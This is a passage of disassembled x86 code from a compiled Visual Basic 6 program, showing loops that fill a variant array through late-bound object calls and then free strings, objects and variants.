0085526D: mov var_00000284, 008F2010h
00855277: push 00000000h
00855279: push 00000014h
0085527B: push 00440E58h
00855280: push 00000010h
00855282: pop eax
00855283: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00855288: lea esi, var_0000017C
0085528E: mov edi, esp
00855290: movsd 
00855291: movsd 
00855292: movsd 
00855293: movsd 
00855294: push 00000001h
00855296: push 00000000h
00855298: push 00440E48h
0085529D: push 00000000h
0085529F: push 00000018h
008552A1: mov eax, var_00000284
008552A7: mov eax, [eax]
008552A9: mov ecx, var_00000284
008552AF: mov ecx, [ecx]
008552B1: mov ecx, [ecx]
008552B3: push eax
008552B4: call [ecx+00000550h]
008552BA: push eax
008552BB: lea eax, var_40
008552BE: push eax
008552BF: call 00410A84h ; Set (object)
008552C4: push eax
008552C5: lea eax, var_68
008552C8: push eax
008552C9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008552CE: add esp, 00000010h
008552D1: push eax
008552D2: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008552D7: push eax
008552D8: lea eax, var_44
008552DB: push eax
008552DC: call 00410A84h ; Set (object)
008552E1: push eax
008552E2: lea eax, var_78
008552E5: push eax
008552E6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008552EB: add esp, 00000020h
008552EE: push eax
008552EF: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008552F4: push eax
008552F5: lea eax, var_48
008552F8: push eax
008552F9: call 00410A84h ; Set (object)
008552FE: push eax
008552FF: lea eax, var_00000088
00855305: push eax
00855306: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0085530B: add esp, 00000010h
0085530E: push eax
0085530F: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00855314: mov edx, eax
00855316: lea ecx, var_38
00855319: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0085531E: push eax
0085531F: call 004109DCh ; Val(arg_1)
00855324: fstp real8 ptr var_000001F4
0085532A: push 00000000h
0085532C: push 0000000Ch
0085532E: push 00000001h
00855330: push 00000000h
00855332: lea eax, var_0000016C
00855338: push eax
00855339: push 00000010h
0085533B: push 00000880h
00855340: call 00410946h ; ReDim
00855345: add esp, 0000001Ch
00855348: lea eax, var_28
0085534B: mov var_00000184, eax
00855351: mov var_0000018C, 00004008h
0085535B: lea esi, var_0000018C
00855361: push 00000000h
00855363: push var_0000016C
00855369: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0085536E: mov ecx, eax
00855370: mov edx, esi
00855372: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855377: mov eax, [ebp+08h]
0085537A: mov eax, [eax]
0085537C: push [ebp+08h]
0085537F: call [eax+0000030Ch]
00855385: mov var_000000D0, eax
0085538B: mov var_000000D8, 00000009h
00855395: lea esi, var_000000D8
0085539B: push 00000001h
0085539D: push var_0000016C
008553A3: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008553A8: mov ecx, eax
008553AA: mov edx, esi
008553AC: call 00410940h ; msvbvm60.dll.__vbaVarZero
008553B1: mov eax, [ebp+08h]
008553B4: mov eax, [eax]
008553B6: push [ebp+08h]
008553B9: call [eax+0000031Ch]
008553BF: mov var_000000E0, eax
008553C5: mov var_000000E8, 00000009h
008553CF: lea esi, var_000000E8
008553D5: push 00000002h
008553D7: push var_0000016C
008553DD: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008553E2: mov ecx, eax
008553E4: mov edx, esi
008553E6: call 00410940h ; msvbvm60.dll.__vbaVarZero
008553EB: mov eax, [ebp+08h]
008553EE: mov eax, [eax]
008553F0: push [ebp+08h]
008553F3: call [eax+00000320h]
008553F9: mov var_000000F0, eax
008553FF: mov var_000000F8, 00000009h
00855409: lea esi, var_000000F8
0085540F: push 00000003h
00855411: push var_0000016C
00855417: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0085541C: mov ecx, eax
0085541E: mov edx, esi
00855420: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855425: mov eax, [ebp+08h]
00855428: mov eax, [eax]
0085542A: push [ebp+08h]
0085542D: call [eax+00000324h]
00855433: mov var_00000100, eax
00855439: mov var_00000108, 00000009h
00855443: lea esi, var_00000108
00855449: push 00000004h
0085544B: push var_0000016C
00855451: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855456: mov ecx, eax
00855458: mov edx, esi
0085545A: call 00410940h ; msvbvm60.dll.__vbaVarZero
0085545F: push 00000000h
00855461: push 00000000h
00855463: mov eax, [ebp+08h]
00855466: mov eax, [eax]
00855468: push [ebp+08h]
0085546B: call [eax+0000033Ch]
00855471: push eax
00855472: lea eax, var_4C
00855475: push eax
00855476: call 00410A84h ; Set (object)
0085547B: push eax
0085547C: lea eax, var_00000098
00855482: push eax
00855483: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855488: add esp, 00000010h
0085548B: push eax
0085548C: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00855491: mov var_00000110, eax
00855497: mov var_00000118, 00000008h
008554A1: lea esi, var_00000118
008554A7: push 00000005h
008554A9: push var_0000016C
008554AF: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008554B4: mov ecx, eax
008554B6: mov edx, esi
008554B8: call 00410940h ; msvbvm60.dll.__vbaVarZero
008554BD: push 00000000h
008554BF: push 00000000h
008554C1: mov eax, [ebp+08h]
008554C4: mov eax, [eax]
008554C6: push [ebp+08h]
008554C9: call [eax+0000034Ch]
008554CF: push eax
008554D0: lea eax, var_50
008554D3: push eax
008554D4: call 00410A84h ; Set (object)
008554D9: push eax
008554DA: lea eax, var_000000A8
008554E0: push eax
008554E1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008554E6: add esp, 00000010h
008554E9: push eax
008554EA: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008554EF: mov var_00000120, eax
008554F5: mov var_00000128, 00000008h
008554FF: lea esi, var_00000128
00855505: push 00000006h
00855507: push var_0000016C
0085550D: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855512: mov ecx, eax
00855514: mov edx, esi
00855516: call 00410940h ; msvbvm60.dll.__vbaVarZero
0085551B: push 00000000h
0085551D: push 00000000h
0085551F: mov eax, [ebp+08h]
00855522: mov eax, [eax]
00855524: push [ebp+08h]
00855527: call [eax+00000340h]
0085552D: push eax
0085552E: lea eax, var_54
00855531: push eax
00855532: call 00410A84h ; Set (object)
00855537: push eax
00855538: lea eax, var_000000B8
0085553E: push eax
0085553F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855544: add esp, 00000010h
00855547: push eax
00855548: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0085554D: mov var_00000130, eax
00855553: mov var_00000138, 00000008h
0085555D: lea esi, var_00000138
00855563: push 00000007h
00855565: push var_0000016C
0085556B: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855570: mov ecx, eax
00855572: mov edx, esi
00855574: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855579: push 00000000h
0085557B: push 00000000h
0085557D: mov eax, [ebp+08h]
00855580: mov eax, [eax]
00855582: push [ebp+08h]
00855585: call [eax+00000344h]
0085558B: push eax
0085558C: lea eax, var_58
0085558F: push eax
00855590: call 00410A84h ; Set (object)
00855595: push eax
00855596: lea eax, var_000000C8
0085559C: push eax
0085559D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008555A2: add esp, 00000010h
008555A5: push eax
008555A6: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008555AB: mov var_00000140, eax
008555B1: mov var_00000148, 00000008h
008555BB: lea esi, var_00000148
008555C1: push 00000008h
008555C3: push var_0000016C
008555C9: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008555CE: mov ecx, eax
008555D0: mov edx, esi
008555D2: call 00410940h ; msvbvm60.dll.__vbaVarZero
008555D7: mov eax, [ebp+08h]
008555DA: mov eax, [eax]
008555DC: push [ebp+08h]
008555DF: call [eax+00000308h]
008555E5: mov var_00000150, eax
008555EB: mov var_00000158, 00000009h
008555F5: lea esi, var_00000158
008555FB: push 00000009h
008555FD: push var_0000016C
00855603: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855608: mov ecx, eax
0085560A: mov edx, esi
0085560C: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855611: lea eax, var_30
00855614: mov var_00000194, eax
0085561A: mov var_0000019C, 00004005h
00855624: lea esi, var_0000019C
0085562A: push 0000000Ah
0085562C: push var_0000016C
00855632: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855637: mov ecx, eax
00855639: mov edx, esi
0085563B: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855640: mov eax, [ebp+08h]
00855643: mov eax, [eax]
00855645: push [ebp+08h]
00855648: call [eax+00000300h]
0085564E: mov var_00000160, eax
00855654: mov var_00000168, 00000009h
0085565E: lea esi, var_00000168
00855664: push 0000000Bh
00855666: push var_0000016C
0085566C: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855671: mov ecx, eax
00855673: mov edx, esi
00855675: call 00410940h ; msvbvm60.dll.__vbaVarZero
0085567A: lea eax, var_34
0085567D: mov var_000001A4, eax
00855683: mov var_000001AC, 0000400Bh
0085568D: lea esi, var_000001AC
00855693: push 0000000Ch
00855695: push var_0000016C
0085569B: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008556A0: mov ecx, eax
008556A2: mov edx, esi
008556A4: call 00410940h ; msvbvm60.dll.__vbaVarZero
008556A9: mov edx, 0043D75Ch ; x70
008556AE: lea ecx, var_3C
008556B1: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008556B6: lea eax, var_0000016C
008556BC: push eax
008556BD: lea eax, var_3C
008556C0: push eax
008556C1: fld real8 ptr var_000001F4
008556C7: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008556CC: push eax
008556CD: call 007A6910h
008556D2: lea eax, var_0000016C
008556D8: push eax
008556D9: push 00000000h
008556DB: call 00410934h ; Erase
008556E0: lea eax, var_3C
008556E3: push eax
008556E4: lea eax, var_38
008556E7: push eax
008556E8: push 00000002h
008556EA: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008556EF: add esp, 0000000Ch
008556F2: lea eax, var_58
008556F5: push eax
008556F6: lea eax, var_54
008556F9: push eax
008556FA: lea eax, var_50
008556FD: push eax
008556FE: lea eax, var_4C
00855701: push eax
00855702: lea eax, var_48
00855705: push eax
00855706: lea eax, var_44
00855709: push eax
0085570A: lea eax, var_40
0085570D: push eax
0085570E: push 00000007h
00855710: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00855715: add esp, 00000020h
00855718: lea eax, var_000000C8
0085571E: push eax
0085571F: lea eax, var_000000B8
00855725: push eax
00855726: lea eax, var_000000A8
0085572C: push eax
0085572D: lea eax, var_00000098
00855733: push eax
00855734: lea eax, var_00000088
0085573A: push eax
0085573B: lea eax, var_78
0085573E: push eax
0085573F: lea eax, var_68
00855742: push eax
00855743: push 00000007h
00855745: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0085574A: add esp, 00000020h
0085574D: lea eax, var_00000220
00855753: push eax
00855754: lea eax, var_00000210
0085575A: push eax
0085575B: lea eax, var_24
0085575E: push eax
0085575F: call 00410A36h ; Next
00855764: mov var_00000250, eax
0085576A: cmp var_00000250, 00000000h
00855771: jnz 00855107h
00855777: jmp 00855F0Dh
0085577C: mov var_00000174, 00000001h
00855786: mov var_0000017C, 00000002h
00855790: cmp [008F2010h], 00000000h
00855797: jnz 8557B4h
00855799: push 008F2010h
0085579E: push 00433984h
008557A3: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008557A8: mov var_00000288, 008F2010h
008557B2: jmp 8557BEh
008557B4: mov var_00000288, 008F2010h
008557BE: push 00000000h
008557C0: push 00000001h
008557C2: push 00440E48h
008557C7: push 00000000h
008557C9: push 00000018h
008557CB: mov eax, var_00000288
008557D1: mov eax, [eax]
008557D3: mov ecx, var_00000288
008557D9: mov ecx, [ecx]
008557DB: mov ecx, [ecx]
008557DD: push eax
008557DE: call [ecx+00000550h]
008557E4: push eax
008557E5: lea eax, var_40
008557E8: push eax
008557E9: call 00410A84h ; Set (object)
008557EE: push eax
008557EF: lea eax, var_68
008557F2: push eax
008557F3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008557F8: add esp, 00000010h
008557FB: push eax
008557FC: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00855801: push eax
00855802: lea eax, var_44
00855805: push eax
00855806: call 00410A84h ; Set (object)
0085580B: push eax
0085580C: lea eax, var_78
0085580F: push eax
00855810: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855815: add esp, 00000010h
00855818: push eax
00855819: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0085581E: mov var_00000184, eax
00855824: mov var_0000018C, 00000003h
0085582E: mov var_00000194, 00000001h
00855838: mov var_0000019C, 00000002h
00855842: lea eax, var_0000017C
00855848: push eax
00855849: lea eax, var_0000018C
0085584F: push eax
00855850: lea eax, var_0000019C
00855856: push eax
00855857: lea eax, var_00000240
0085585D: push eax
0085585E: lea eax, var_00000230
00855864: push eax
00855865: lea eax, var_24
00855868: push eax
00855869: call 00410A3Ch ; For
0085586E: mov var_00000254, eax
00855874: lea eax, var_44
00855877: push eax
00855878: lea eax, var_40
0085587B: push eax
0085587C: push 00000002h
0085587E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00855883: add esp, 0000000Ch
00855886: lea eax, var_78
00855889: push eax
0085588A: lea eax, var_68
0085588D: push eax
0085588E: push 00000002h
00855890: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00855895: add esp, 0000000Ch
00855898: jmp 00855F00h
0085589D: lea eax, var_24
008558A0: mov var_00000174, eax
008558A6: mov var_0000017C, 0000400Ch
008558B0: cmp [008F2010h], 00000000h
008558B7: jnz 8558D4h
008558B9: push 008F2010h
008558BE: push 00433984h
008558C3: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008558C8: mov var_0000028C, 008F2010h
008558D2: jmp 8558DEh
008558D4: mov var_0000028C, 008F2010h
008558DE: push 00000000h
008558E0: push 00000004h
008558E2: push 00440E58h
008558E7: push 00000010h
008558E9: pop eax
008558EA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008558EF: lea esi, var_0000017C
008558F5: mov edi, esp
008558F7: movsd 
008558F8: movsd 
008558F9: movsd 
008558FA: movsd 
008558FB: push 00000001h
008558FD: push 00000000h
008558FF: push 00440E48h
00855904: push 00000000h
00855906: push 00000018h
00855908: mov eax, var_0000028C
0085590E: mov eax, [eax]
00855910: mov ecx, var_0000028C
00855916: mov ecx, [ecx]
00855918: mov ecx, [ecx]
0085591A: push eax
0085591B: call [ecx+00000550h]
00855921: push eax
00855922: lea eax, var_40
00855925: push eax
00855926: call 00410A84h ; Set (object)
0085592B: push eax
0085592C: lea eax, var_68
0085592F: push eax
00855930: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855935: add esp, 00000010h
00855938: push eax
00855939: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0085593E: push eax
0085593F: lea eax, var_44
00855942: push eax
00855943: call 00410A84h ; Set (object)
00855948: push eax
00855949: lea eax, var_78
0085594C: push eax
0085594D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855952: add esp, 00000020h
00855955: push eax
00855956: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0085595B: push eax
0085595C: lea eax, var_48
0085595F: push eax
00855960: call 00410A84h ; Set (object)
00855965: push eax
00855966: lea eax, var_00000088
0085596C: push eax
0085596D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855972: add esp, 00000010h
00855975: push eax
00855976: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
0085597B: sub ax, FFFFh
0085597F: neg ax
00855982: sbb eax, eax
00855984: inc eax
00855985: neg eax
00855987: mov var_000001F8, ax
0085598E: lea eax, var_48
00855991: push eax
00855992: lea eax, var_44
00855995: push eax
00855996: lea eax, var_40
00855999: push eax
0085599A: push 00000003h
0085599C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008559A1: add esp, 00000010h
008559A4: lea eax, var_00000088
008559AA: push eax
008559AB: lea eax, var_78
008559AE: push eax
008559AF: lea eax, var_68
008559B2: push eax
008559B3: push 00000003h
008559B5: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008559BA: add esp, 00000010h
008559BD: movsx eax, word ptr var_000001F8
008559C4: test eax, eax
008559C6: jz 00855EE3h
008559CC: lea eax, var_24
008559CF: mov var_00000174, eax
008559D5: mov var_0000017C, 0000400Ch
008559DF: cmp [008F2010h], 00000000h
008559E6: jnz 855A03h
008559E8: push 008F2010h
008559ED: push 00433984h
008559F2: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008559F7: mov var_00000290, 008F2010h
00855A01: jmp 855A0Dh
00855A03: mov var_00000290, 008F2010h
00855A0D: push 00000000h
00855A0F: push 00000014h
00855A11: push 00440E58h
00855A16: push 00000010h
00855A18: pop eax
00855A19: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00855A1E: lea esi, var_0000017C
00855A24: mov edi, esp
00855A26: movsd 
00855A27: movsd 
00855A28: movsd 
00855A29: movsd 
00855A2A: push 00000001h
00855A2C: push 00000000h
00855A2E: push 00440E48h
00855A33: push 00000000h
00855A35: push 00000018h
00855A37: mov eax, var_00000290
00855A3D: mov eax, [eax]
00855A3F: mov ecx, var_00000290
00855A45: mov ecx, [ecx]
00855A47: mov ecx, [ecx]
00855A49: push eax
00855A4A: call [ecx+00000550h]
00855A50: push eax
00855A51: lea eax, var_40
00855A54: push eax
00855A55: call 00410A84h ; Set (object)
00855A5A: push eax
00855A5B: lea eax, var_68
00855A5E: push eax
00855A5F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855A64: add esp, 00000010h
00855A67: push eax
00855A68: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00855A6D: push eax
00855A6E: lea eax, var_44
00855A71: push eax
00855A72: call 00410A84h ; Set (object)
00855A77: push eax
00855A78: lea eax, var_78
00855A7B: push eax
00855A7C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855A81: add esp, 00000020h
00855A84: push eax
00855A85: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00855A8A: push eax
00855A8B: lea eax, var_48
00855A8E: push eax
00855A8F: call 00410A84h ; Set (object)
00855A94: push eax
00855A95: lea eax, var_00000088
00855A9B: push eax
00855A9C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855AA1: add esp, 00000010h
00855AA4: push eax
00855AA5: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00855AAA: mov edx, eax
00855AAC: lea ecx, var_38
00855AAF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00855AB4: push eax
00855AB5: call 004109DCh ; Val(arg_1)
00855ABA: fstp real8 ptr var_000001F4
00855AC0: push 00000000h
00855AC2: push 0000000Ch
00855AC4: push 00000001h
00855AC6: push 00000000h
00855AC8: lea eax, var_0000016C
00855ACE: push eax
00855ACF: push 00000010h
00855AD1: push 00000880h
00855AD6: call 00410946h ; ReDim
00855ADB: add esp, 0000001Ch
00855ADE: lea eax, var_28
00855AE1: mov var_00000184, eax
00855AE7: mov var_0000018C, 00004008h
00855AF1: lea esi, var_0000018C
00855AF7: push 00000000h
00855AF9: push var_0000016C
00855AFF: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855B04: mov ecx, eax
00855B06: mov edx, esi
00855B08: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855B0D: mov eax, [ebp+08h]
00855B10: mov eax, [eax]
00855B12: push [ebp+08h]
00855B15: call [eax+0000030Ch]
00855B1B: mov var_000000D0, eax
00855B21: mov var_000000D8, 00000009h
00855B2B: lea esi, var_000000D8
00855B31: push 00000001h
00855B33: push var_0000016C
00855B39: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855B3E: mov ecx, eax
00855B40: mov edx, esi
00855B42: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855B47: mov eax, [ebp+08h]
00855B4A: mov eax, [eax]
00855B4C: push [ebp+08h]
00855B4F: call [eax+0000031Ch]
00855B55: mov var_000000E0, eax
00855B5B: mov var_000000E8, 00000009h
00855B65: lea esi, var_000000E8
00855B6B: push 00000002h
00855B6D: push var_0000016C
00855B73: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855B78: mov ecx, eax
00855B7A: mov edx, esi
00855B7C: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855B81: mov eax, [ebp+08h]
00855B84: mov eax, [eax]
00855B86: push [ebp+08h]
00855B89: call [eax+00000320h]
00855B8F: mov var_000000F0, eax
00855B95: mov var_000000F8, 00000009h
00855B9F: lea esi, var_000000F8
00855BA5: push 00000003h
00855BA7: push var_0000016C
00855BAD: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855BB2: mov ecx, eax
00855BB4: mov edx, esi
00855BB6: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855BBB: mov eax, [ebp+08h]
00855BBE: mov eax, [eax]
00855BC0: push [ebp+08h]
00855BC3: call [eax+00000324h]
00855BC9: mov var_00000100, eax
00855BCF: mov var_00000108, 00000009h
00855BD9: lea esi, var_00000108
00855BDF: push 00000004h
00855BE1: push var_0000016C
00855BE7: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855BEC: mov ecx, eax
00855BEE: mov edx, esi
00855BF0: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855BF5: push 00000000h
00855BF7: push 00000000h
00855BF9: mov eax, [ebp+08h]
00855BFC: mov eax, [eax]
00855BFE: push [ebp+08h]
00855C01: call [eax+0000033Ch]
00855C07: push eax
00855C08: lea eax, var_4C
00855C0B: push eax
00855C0C: call 00410A84h ; Set (object)
00855C11: push eax
00855C12: lea eax, var_00000098
00855C18: push eax
00855C19: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855C1E: add esp, 00000010h
00855C21: push eax
00855C22: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00855C27: mov var_00000110, eax
00855C2D: mov var_00000118, 00000008h
00855C37: lea esi, var_00000118
00855C3D: push 00000005h
00855C3F: push var_0000016C
00855C45: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855C4A: mov ecx, eax
00855C4C: mov edx, esi
00855C4E: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855C53: push 00000000h
00855C55: push 00000000h
00855C57: mov eax, [ebp+08h]
00855C5A: mov eax, [eax]
00855C5C: push [ebp+08h]
00855C5F: call [eax+0000034Ch]
00855C65: push eax
00855C66: lea eax, var_50
00855C69: push eax
00855C6A: call 00410A84h ; Set (object)
00855C6F: push eax
00855C70: lea eax, var_000000A8
00855C76: push eax
00855C77: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855C7C: add esp, 00000010h
00855C7F: push eax
00855C80: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00855C85: mov var_00000120, eax
00855C8B: mov var_00000128, 00000008h
00855C95: lea esi, var_00000128
00855C9B: push 00000006h
00855C9D: push var_0000016C
00855CA3: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855CA8: mov ecx, eax
00855CAA: mov edx, esi
00855CAC: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855CB1: push 00000000h
00855CB3: push 00000000h
00855CB5: mov eax, [ebp+08h]
00855CB8: mov eax, [eax]
00855CBA: push [ebp+08h]
00855CBD: call [eax+00000340h]
00855CC3: push eax
00855CC4: lea eax, var_54
00855CC7: push eax
00855CC8: call 00410A84h ; Set (object)
00855CCD: push eax
00855CCE: lea eax, var_000000B8
00855CD4: push eax
00855CD5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855CDA: add esp, 00000010h
00855CDD: push eax
00855CDE: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00855CE3: mov var_00000130, eax
00855CE9: mov var_00000138, 00000008h
00855CF3: lea esi, var_00000138
00855CF9: push 00000007h
00855CFB: push var_0000016C
00855D01: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855D06: mov ecx, eax
00855D08: mov edx, esi
00855D0A: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855D0F: push 00000000h
00855D11: push 00000000h
00855D13: mov eax, [ebp+08h]
00855D16: mov eax, [eax]
00855D18: push [ebp+08h]
00855D1B: call [eax+00000344h]
00855D21: push eax
00855D22: lea eax, var_58
00855D25: push eax
00855D26: call 00410A84h ; Set (object)
00855D2B: push eax
00855D2C: lea eax, var_000000C8
00855D32: push eax
00855D33: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00855D38: add esp, 00000010h
00855D3B: push eax
00855D3C: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00855D41: mov var_00000140, eax
00855D47: mov var_00000148, 00000008h
00855D51: lea esi, var_00000148
00855D57: push 00000008h
00855D59: push var_0000016C
00855D5F: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855D64: mov ecx, eax
00855D66: mov edx, esi
00855D68: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855D6D: mov eax, [ebp+08h]
00855D70: mov eax, [eax]
00855D72: push [ebp+08h]
00855D75: call [eax+00000308h]
00855D7B: mov var_00000150, eax
00855D81: mov var_00000158, 00000009h
00855D8B: lea esi, var_00000158
00855D91: push 00000009h
00855D93: push var_0000016C
00855D99: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855D9E: mov ecx, eax
00855DA0: mov edx, esi
00855DA2: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855DA7: lea eax, var_30
00855DAA: mov var_00000194, eax
00855DB0: mov var_0000019C, 00004005h
00855DBA: lea esi, var_0000019C
00855DC0: push 0000000Ah
00855DC2: push var_0000016C
00855DC8: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855DCD: mov ecx, eax
00855DCF: mov edx, esi
00855DD1: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855DD6: mov eax, [ebp+08h]
00855DD9: mov eax, [eax]
00855DDB: push [ebp+08h]
00855DDE: call [eax+00000300h]
00855DE4: mov var_00000160, eax
00855DEA: mov var_00000168, 00000009h
00855DF4: lea esi, var_00000168
00855DFA: push 0000000Bh
00855DFC: push var_0000016C
00855E02: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855E07: mov ecx, eax
00855E09: mov edx, esi
00855E0B: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855E10: lea eax, var_34
00855E13: mov var_000001A4, eax
00855E19: mov var_000001AC, 0000400Bh
00855E23: lea esi, var_000001AC
00855E29: push 0000000Ch
00855E2B: push var_0000016C
00855E31: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00855E36: mov ecx, eax
00855E38: mov edx, esi
00855E3A: call 00410940h ; msvbvm60.dll.__vbaVarZero
00855E3F: mov edx, 0043D75Ch ; x70
00855E44: lea ecx, var_3C
00855E47: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00855E4C: lea eax, var_0000016C
00855E52: push eax
00855E53: lea eax, var_3C
00855E56: push eax
00855E57: fld real8 ptr var_000001F4
00855E5D: call 004108E6h ; msvbvm60.dll.__vbaFpI2
00855E62: push eax
00855E63: call 007A6910h
00855E68: lea eax, var_0000016C
00855E6E: push eax
00855E6F: push 00000000h
00855E71: call 00410934h ; Erase
00855E76: lea eax, var_3C
00855E79: push eax
00855E7A: lea eax, var_38
00855E7D: push eax
00855E7E: push 00000002h
00855E80: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00855E85: add esp, 0000000Ch
00855E88: lea eax, var_58
00855E8B: push eax
00855E8C: lea eax, var_54
00855E8F: push eax
00855E90: lea eax, var_50
00855E93: push eax
00855E94: lea eax, var_4C
00855E97: push eax
00855E98: lea eax, var_48
00855E9B: push eax
00855E9C: lea eax, var_44
00855E9F: push eax
00855EA0: lea eax, var_40
00855EA3: push eax
00855EA4: push 00000007h
00855EA6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00855EAB: add esp, 00000020h
00855EAE: lea eax, var_000000C8
00855EB4: push eax
00855EB5: lea eax, var_000000B8
00855EBB: push eax
00855EBC: lea eax, var_000000A8
00855EC2: push eax
00855EC3: lea eax, var_00000098
00855EC9: push eax
00855ECA: lea eax, var_00000088
00855ED0: push eax
00855ED1: lea eax, var_78
00855ED4: push eax
00855ED5: lea eax, var_68
00855ED8: push eax
00855ED9: push 00000007h
00855EDB: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00855EE0: add esp, 00000020h
00855EE3: lea eax, var_00000240
00855EE9: push eax
00855EEA: lea eax, var_00000230
00855EF0: push eax
00855EF1: lea eax, var_24
00855EF4: push eax
00855EF5: call 00410A36h ; Next
00855EFA: mov var_00000254, eax
00855F00: cmp var_00000254, 00000000h
00855F07: jnz 0085589Dh
00855F0D: mov var_04, 00000000h
00855F14: wait 
00855F15: push 00856023h
00855F1A: jmp 00855FE1h
00855F1F: lea eax, var_3C
00855F22: push eax
00855F23: lea eax, var_38
00855F26: push eax
00855F27: push 00000002h
00855F29: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00855F2E: add esp, 0000000Ch
00855F31: lea eax, var_58
00855F34: push eax
00855F35: lea eax, var_54
00855F38: push eax
00855F39: lea eax, var_50
00855F3C: push eax
00855F3D: lea eax, var_4C
00855F40: push eax
00855F41: lea eax, var_48
00855F44: push eax
00855F45: lea eax, var_44
